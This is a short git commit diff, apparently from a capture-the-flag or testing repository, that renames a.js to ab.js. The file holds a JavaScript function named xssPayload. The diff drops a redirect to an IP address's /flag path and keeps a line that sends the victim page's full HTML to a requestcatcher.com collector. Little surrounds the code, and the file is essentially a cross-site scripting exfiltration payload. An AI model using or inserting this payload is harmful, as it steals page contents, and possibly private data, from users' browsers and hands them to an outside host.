255aa55830de88e8f281e7aa780f25764ec20a36
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-03-04 15:06:04 +0530

    Update and rename a.js to ab.js

--- ab.js
+++ ab.js
@@ -1,6 +1,4 @@
 function xssPayload() {
-  document.location="http://165.232.190.5:1900/flag";
-  sleep(2000);
   document.location="https://xss.requestcatcher.com/test"+document.body.innerHTML;
 }
 
